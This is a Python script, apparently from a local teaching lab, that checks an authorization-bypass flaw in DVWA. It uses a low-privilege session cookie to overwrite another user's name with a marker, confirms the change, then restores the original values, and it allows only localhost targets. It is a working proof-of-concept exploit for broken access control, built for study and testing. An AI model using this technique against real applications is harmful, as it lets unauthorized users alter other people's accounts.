#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AUTH-001-F2 write-side check: can a non-admin session change another user?

Records the original values through the read endpoint, submits a harmless marker
to one dedicated test user, re-reads through the independent read path, then
restores the original values and re-reads again.

Local teaching lab only. Paths come from AUTH-001-B line 13 and line 28.
Credentials are supplied from a local file and never printed.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
READ_PATH = "/vulnerabilities/authbypass/get_user_data.php"
WRITE_PATH = "/vulnerabilities/authbypass/change_user_details.php"
MARKER = "wp2-lab-marker"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_base(raw):
    parts = urllib.parse.urlparse(raw)
    if parts.scheme not in ("http", "https"):
        sys.exit("base must be http(s): %r" % raw)
    if (parts.hostname or "") not in ALLOWED_HOSTS:
        sys.exit("only localhost/127.0.0.1/::1 allowed, got %r" % (parts.hostname,))
    return raw.rstrip("/")


def read_cookie(path):
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        sys.exit("cookie file is empty")
    return value


def call(base, path, cookie, timeout, payload=None):
    headers = {"Accept": "application/json", "Cookie": cookie}
    data = None
    method = "GET"
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
        method = "POST"
    req = urllib.request.Request(base + path, data=data, headers=headers, method=method)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        sys.exit("connection/protocol error: %s" % exc)


def users_by_id(base, cookie, timeout):
    status, body = call(base, READ_PATH, cookie, timeout)
    try:
        payload = json.loads(body)
    except ValueError:
        return status, None
    if not isinstance(payload, list):
        return status, None
    table = {}
    for item in payload:
        if isinstance(item, dict):
            table[str(item.get("user_id"))] = (item.get("first_name"), item.get("surname"))
    return status, table


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. http://127.0.0.1/dvwa")
    ap.add_argument("--cookie-file", required=True,
                    help="local file holding the low-privilege Cookie header value")
    ap.add_argument("--target-id", required=True,
                    help="dedicated test user_id owned by the lab, not a real account")
    ap.add_argument("--security", default=None)
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    base = parse_base(args.base)
    cookie = read_cookie(args.cookie_file)
    if args.security:
        cookie = cookie + "; security=" + args.security

    status, before = users_by_id(base, cookie, args.timeout)
    if before is None:
        print("READ-BACK failed (status=%s); original values unknown, aborting" % status)
        return 2
    if args.target_id not in before:
        print("target id %r not present in read-back; pick a seeded test user" % args.target_id)
        return 2

    orig_first, orig_surname = before[args.target_id]
    print("ORIGINAL id=%s first_name=%r surname=%r" % (args.target_id, orig_first, orig_surname))

    payload = {"id": args.target_id, "first_name": MARKER, "surname": MARKER}
    status_w, body_w = call(base, WRITE_PATH, cookie, args.timeout, payload)
    print("WRITE http_status=%s body=%s" % (status_w, body_w[:200]))
    try:
        write_ok = json.loads(body_w).get("result") == "ok"
    except (ValueError, AttributeError):
        write_ok = False
    print("WRITE result_ok=%s (by itself NOT proof of modification)" % write_ok)

    status_r, after = users_by_id(base, cookie, args.timeout)
    changed = after is not None and after.get(args.target_id) == (MARKER, MARKER)
    print("READ-BACK AFTER http_status=%s row=%r" % (status_r, (after or {}).get(args.target_id)))
    print("EVIDENCE: marker visible through independent read path = %s" % changed)

    restore = {"id": args.target_id, "first_name": orig_first, "surname": orig_surname}
    status_o, body_o = call(base, WRITE_PATH, cookie, args.timeout, restore)
    print("RESTORE http_status=%s body=%s" % (status_o, body_o[:200]))

    status_v, final = users_by_id(base, cookie, args.timeout)
    restored = final is not None and final.get(args.target_id) == (orig_first, orig_surname)
    print("RESTORED via read path = %s row=%r" % (restored, (final or {}).get(args.target_id)))
    if changed and not restored:
        print("WARNING: record not restored, restore it manually before leaving the lab")
    return 0


if __name__ == "__main__":
    main()
